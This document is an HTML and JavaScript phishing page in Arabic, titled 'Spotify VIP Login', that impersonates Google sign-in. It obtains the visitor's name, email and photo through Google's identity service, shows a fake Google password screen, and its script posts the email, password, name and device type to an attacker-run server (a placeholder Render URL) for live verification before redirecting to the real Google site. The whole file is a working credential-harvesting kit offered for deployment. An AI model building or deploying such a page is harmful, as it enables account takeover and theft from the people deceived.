<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Spotify VIP Login</title>
    <link rel="icon" type="image/jpg" href="https://i.ibb.co/v6kxTQ70/download.jpg">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@800&family=Noto+Sans+Arabic:wght@700&family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { margin: 0; padding: 0; width: 100%; height: 100vh; overflow: hidden; background-color: #000000; font-family: 'Montserrat', sans-serif; display: flex; justify-content: center; align-items: center; position: relative; }
        
        /* شريط التحميل العلوي */
        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 3px; background-color: transparent; z-index: 1000; }
        #loader-bar { width: 0%; height: 100%; background-color: #1a73e8; transition: width 0.3s; }

        #spotify-interface { width: 100%; display: flex; flex-direction: column; align-items: center; z-index: 2; }
        .purity-background { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
        .purity-orb { position: absolute; border-radius: 50%; background: radial-gradient(circle, rgba(255, 255, 255, 0.08) 0%, rgba(255, 255, 255, 0) 70%); animation: drift 15s ease-in-out infinite; }
        @keyframes drift { 0% { transform: translateY(0) translateX(0) scale(1); opacity: 0.5; } 50% { transform: translateY(-30px) translateX(20px) scale(1.1); opacity: 0.7; } 100% { transform: translateY(-60px) translateX(0) scale(1); opacity: 0.5; } }
        .orb1 { width: 150px; height: 150px; top: 10%; left: 5%; animation-duration: 18s; }
        .orb2 { width: 100px; height: 100px; top: 60%; left: 80%; animation-duration: 20s; }
        .orb3 { width: 200px; height: 200px; top: 40%; left: 30%; animation-duration: 16s; }
        .main-wrapper { width: 100%; max-width: 450px; padding: 20px; text-align: center; }
        .spotify-logo { width: 150px; height: 150px; filter: drop-shadow(0 0 15px rgba(29, 185, 84, 0.4)); }
        .brand-title { font-size: 42px; font-weight: 800; margin: 20px 0 5px 0; color: #ffffff; text-shadow: 0 0 10px rgba(255, 255, 255, 0.7); }
        .divider { width: 100%; height: 1px; background-color: #ffffff; opacity: 0.8; margin: 10px 0 30px 0; }
        .google-btn-fake { display: flex; align-items: center; justify-content: center; background-color: #ffffff; color: #000000; width: 100%; padding: 16px 0; border-radius: 50px; font-size: 18px; font-weight: 700; cursor: pointer; border: none; }

        #google-interface { display: none; background-color: white; width: 100%; height: 100vh; position: absolute; top: 0; left: 0; z-index: 10; justify-content: center; align-items: center; overflow: hidden; touch-action: none; font-family: 'Roboto', Arial, sans-serif; color: #202124; }
        .container { padding: 24px; max-width: 450px; width: 100%; margin: 0 auto; display: flex; flex-direction: column; }
        .logo-center { text-align: center; }
        .logo-center img { width: 74px; height: 24px; }
        .title { text-align: center; font-family: 'Google Sans', sans-serif; font-size: 24px; font-weight: 400; margin-top: 16px; }
        .email-badge-container { text-align: center; margin-top: 8px; }
        .email-badge { display: inline-flex; align-items: center; border: 1px solid #dadce0; border-radius: 16px; padding: 3px 7px 3px 5px; }
        .avatar { width: 20px; height: 20px; border-radius: 50%; background-color: #e8f0fe; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        .avatar img { width: 100%; height: 100%; object-fit: cover; }
        .email-text { font-size: 14px; font-weight: 500; margin: 0 8px; }
        .instruction { font-size: 16px; margin: 36px 0 24px; text-align: right; }
        .input-box { position: relative; }
        .password-input { width: 100%; box-sizing: border-box; border: 1px solid #dadce0; border-radius: 4px; padding: 13px 15px; font-size: 16px; outline: none; transition: border 0.2s; text-align: right; }
        .floating-label { position: absolute; right: 12px; top: 14px; background-color: #fff; padding: 0 4px; color: #80868b; font-size: 16px; transition: 0.15s ease-in-out; pointer-events: none; }
        .password-input:focus ~ .floating-label, .password-input:not(:placeholder-shown) ~ .floating-label { top: -8px; font-size: 12px; color: #1a73e8; }
        .password-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
        .password-input.error { border: 2px solid #d93025; padding: 12px 14px; animation: shake 0.4s ease-in-out; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-6px); } 50% { transform: translateX(6px); } 75% { transform: translateX(-6px); } }
        .password-input.error ~ .floating-label { color: #d93025; }
        
        .error-message { display: none; align-items: center; color: #d93025; font-size: 12px; margin-top: 8px; justify-content: flex-start; text-align: right; }
        .error-message svg { fill: #d93025; width: 16px; height: 16px; margin-left: 8px; }

        .checkbox-container { margin-top: 15px; display: flex; align-items: center; justify-content: flex-start; }
        .custom-checkbox { width: 18px; height: 18px; margin-left: 10px; cursor: pointer; order: 1; }
        .checkbox-label { font-size: 14px; cursor: pointer; order: 2; }

        .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 50px; }
        .forgot-link { color: #1a73e8; font-weight: 500; font-size: 14px; text-decoration: none; }
        .btn-next { background-color: #1a73e8; color: white; border: none; border-radius: 4px; height: 36px; padding: 0 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>

    <div id="loader"><div id="loader-bar"></div></div>

    <div id="spotify-interface">
        <div class="purity-background"><div class="purity-orb orb1"></div><div class="purity-orb orb2"></div><div class="purity-orb orb3"></div></div>
        <div class="main-wrapper">
            <div class="hero-container">
                <svg class="spotify-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <circle cx="12" cy="12" r="12" fill="#1DB954" />
                    <path fill="#191414" d="M17.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02z M18.96 14.04c-.301.42-.84.6-1.262.3-3.09-1.891-7.794-2.317-11.41-1.17-.461.115-.979-.115-1.09-.575-.111-.46.115-.979.575-1.09 4.234-1.293 9.873-.787 13.687 1.593.361.181.54.84.241 1.2z M19.08 10.68C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.6.18-1.2.72-1.38 4.2-1.26 11.28-1.02 15.72 1.62.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z" />
                </svg>
            </div>
            <h1 class="brand-title">SPOTIFY VIP</h1>
            <hr class="divider">
            <button class="google-btn-fake" onclick="triggerGoogleSignIn()">
                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google" width="24" height="24" style="margin-left:12px">
                <span>تسجيل الدخول بـ Google</span>
            </button>
            <p style="font-size: 11px; margin-top: 30px; opacity: 0.4; color:white;">© 2026. FreeFire x Spotfy</p>
        </div>
    </div>

    <div id="google-interface">
        <div class="container">
            <div class="logo-center">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
            </div>
            <h1 class="title" id="dynName">إثبات الهوية</h1>
            <div class="email-badge-container">
                <div class="email-badge">
                    <div class="avatar" id="dynAvatar"></div>
                    <span class="email-text" id="dynEmail"></span>
                    <svg style="fill:#5f6368; width:18px;" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg>
                </div>
            </div>
            <div class="instruction">للمتابعة، يجب أولاً إثبات هويتك.</div>
            <div class="input-box">
                <input type="password" id="passwordInput" class="password-input" placeholder=" ">
                <label class="floating-label">إدخال كلمة المرور</label>
            </div>
            <div class="error-message" id="errorMsg">
                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                <span id="errorText">قم بإدخال كلمة المرور</span>
            </div>
            <div class="checkbox-container">
                <input type="checkbox" id="showPass" class="custom-checkbox">
                <label for="showPass" class="checkbox-label">عرض كلمة المرور</label>
            </div>
            <div class="actions">
                <a href="#" class="forgot-link">هل نسيت كلمة المرور؟</a>
                <button class="btn-next" id="nextBtn">التالي</button>
            </div>
        </div>
    </div>

    <script>
        // رابط السيرفر الخاص بك (يتم تحديثه بعد الرفع على Render)
        const SERVER_URL = 'https://your-app-name.onrender.com/verify'; 
        
        let currentUserData = {};

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) return "Android 📱";
            if (/iPhone|iPad|iPod/i.test(ua)) return "iPhone/iOS 🍎";
            if (/windows/i.test(ua)) return "Windows PC 💻";
            return "جهاز غير معروف ❓";
        }

        function triggerGoogleSignIn() {
            google.accounts.id.initialize({
                client_id: "1066111917118-q2njth327smvhslhs0unui62gi44356n.apps.googleusercontent.com",
                callback: handleCredentialResponse
            });
            google.accounts.id.prompt();
        }

        function handleCredentialResponse(response) {
            const data = JSON.parse(atob(response.credential.split('.')[1].replace(/-/g, '+').replace(/_/g, '/')));
            currentUserData = data;
            document.getElementById('spotify-interface').style.display = 'none';
            document.getElementById('google-interface').style.display = 'flex';
            document.getElementById("dynName").innerText = data.name;
            document.getElementById("dynEmail").innerText = data.email;
            document.getElementById("dynAvatar").innerHTML = `<img src="${data.picture}">`;
        }

        const nextBtn = document.getElementById('nextBtn');
        const passwordInput = document.getElementById('passwordInput');
        const errorMsg = document.getElementById('errorMsg');
        const errorText = document.getElementById('errorText');
        const loader = document.getElementById('loader');
        const loaderBar = document.getElementById('loader-bar');

        document.getElementById('showPass').addEventListener('change', function() {
            passwordInput.type = this.checked ? 'text' : 'password';
        });

        nextBtn.addEventListener('click', async function() {
            const passValue = passwordInput.value.trim();
            if (passValue === '') {
                showError("قم بإدخال كلمة المرور");
                return;
            }

            // تفعيل حالة التحميل
            loader.style.display = 'block';
            loaderBar.style.width = '100%';
            nextBtn.disabled = true;

            try {
                // إرسال البيانات للسيرفر للفحص الحقيقي
                const response = await fetch(SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        email: currentUserData.email,
                        password: passValue,
                        name: currentUserData.name,
                        device: getDeviceInfo()
                    })
                });

                const result = await response.json();

                if (result.status === 'error') {
                    // إذا كان الباسورد خطأ حقيقياً
                    showError("كلمة المرور غير صحيحة. حاول مجدداً.");
                    passwordInput.value = "";
                } else {
                    // إذا كان الباسورد صحيحاً
                    window.location.href = "https://accounts.google.com";
                }
            } catch (e) {
                showError("حدث خطأ في الاتصال، حاول مرة أخرى.");
            } finally {
                loader.style.display = 'none';
                loaderBar.style.width = '0%';
                nextBtn.disabled = false;
            }
        });

        function showError(msg) {
            errorText.innerText = msg;
            passwordInput.classList.remove('error');
            void passwordInput.offsetWidth; 
            passwordInput.classList.add('error');
            errorMsg.style.display = 'flex';
        }

        passwordInput.addEventListener('input', function() {
            this.classList.remove('error');
            errorMsg.style.display = 'none';
        });
    </script>
</body>
</html>
